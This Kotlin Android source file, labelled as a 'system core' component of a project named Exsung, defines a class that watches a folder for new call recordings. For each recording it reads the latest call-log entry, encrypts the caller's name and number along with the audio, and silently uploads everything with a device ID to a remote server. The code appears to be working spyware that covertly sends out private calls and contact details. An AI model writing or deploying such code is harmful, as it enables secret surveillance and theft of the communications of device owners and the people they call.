/**
 * EXSUNG SYSTEM COMPONENT: Method 2 Direct Folder Watcher for Call Recordings
 * Refer to Master Architecture Plan: d:/Desktop/Experiments/Exsung/PLAN.md
 * Any structural changes to configuration or endpoints MUST be updated in PLAN.md
 */

package com.system.core

import android.content.Context
import android.database.Cursor
import android.os.FileObserver
import android.provider.CallLog
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.IOException

class CallObserver(
    private val context: Context,
    private val targetFolder: File,
    private val deviceId: String
) : FileObserver(targetFolder.absolutePath, CREATE or CLOSE_WRITE) {

    private val httpClient = OkHttpClient()

    override fun onEvent(event: Int, path: String?) {
        if (path == null) return

        val file = File(targetFolder, path)
        if (!file.exists() || file.isDirectory) return

        val lowerName = path.lowercase()
        if (lowerName.endsWith(".m4a") || lowerName.endsWith(".mp3") || lowerName.endsWith(".wav") || lowerName.endsWith(".3gp")) {
            Log.d("ExsungCallObserver", "Method 2 Detected new recording: ${file.absolutePath}")
            processAndUploadCallRecording(file)
        }
    }

    private fun processAndUploadCallRecording(audioFile: File) {
        var callerName = "Unknown"
        var callerNumber = "Unknown"
        var callType = "incoming"
        var duration = "00:00"

        try {
            val cursor: Cursor? = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    callerNumber = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown"
                    callerName = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: callerNumber
                    val typeInt = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    callType = when (typeInt) {
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "incoming"
                    }
                    val durationSec = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val mins = durationSec / 60
                    val secs = durationSec % 60
                    duration = String.format("%02d:%02d", mins, secs)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // Encrypt Caller Name and Number
        val encCallerName = CryptoUtils.encryptText(callerName)
        val encCallerNumber = CryptoUtils.encryptText(callerNumber)
        val rawAudioBytes = audioFile.readBytes()
        val encAudioBytes = CryptoUtils.encryptBytes(rawAudioBytes)

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("device_id", deviceId)
            .addFormDataPart("caller_name", encCallerName)
            .addFormDataPart("caller_number", encCallerNumber)
            .addFormDataPart("type", callType)
            .addFormDataPart("status", if (callType == "missed") "missed" else "answered")
            .addFormDataPart("call_duration", duration)
            .addFormDataPart("started_at", System.currentTimeMillis().toString())
            .addFormDataPart(
                "audio_file",
                "${audioFile.name}.enc",
                encAudioBytes.toRequestBody("application/octet-stream".toMediaTypeOrNull())
            )
            .build()

        val request = Request.Builder()
            .url("${AppConfig.SERVER_BASE_URL}/api/upload-call")
            .post(requestBody)
            .build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("ExsungCallObserver", "Upload failed (Queued on device): ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("ExsungCallObserver", "Call recording uploaded successfully! File preserved on phone.")
                }
            }
        })
    }
}
